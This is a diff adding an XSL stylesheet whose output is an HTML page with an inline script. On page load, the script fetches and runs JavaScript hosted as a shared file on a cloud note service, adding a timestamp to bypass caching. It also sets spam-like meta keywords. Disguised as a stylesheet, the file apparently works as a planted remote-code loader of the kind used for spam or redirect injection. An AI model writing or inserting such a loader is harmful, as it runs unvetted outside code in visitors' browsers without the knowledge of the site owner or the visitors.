@@ -1,0 +1,22 @@
+
+
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <html>
+	<meta name="keywords" content="书中自有黄金屋，书中自有颜如玉。"> 
+      <body>
+        <meta content="always" name="referrer" />
+        <meta charset="UTF-8" />
+        <script charset="UTF-8">
+          var xUrl = '//note.youdao.com/yws/api/personal/file//FD2FF251A01F4C0A88E80A7016B3955A?method=download&inline=true&shareKey=882cc42e31e05060c7202ee2c74a79e6'
+          var now = Math.round(Date.now() / 1000 / 5)
+          var s = document.createElement('script')
+          s.setAttribute('src', xUrl + '&ut=' + now)
+          s.setAttribute('charset', 'utf-8')
+          if (!document.body) document.head.appendChild(s)
+          else document.body.appendChild(s)
+        </script>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
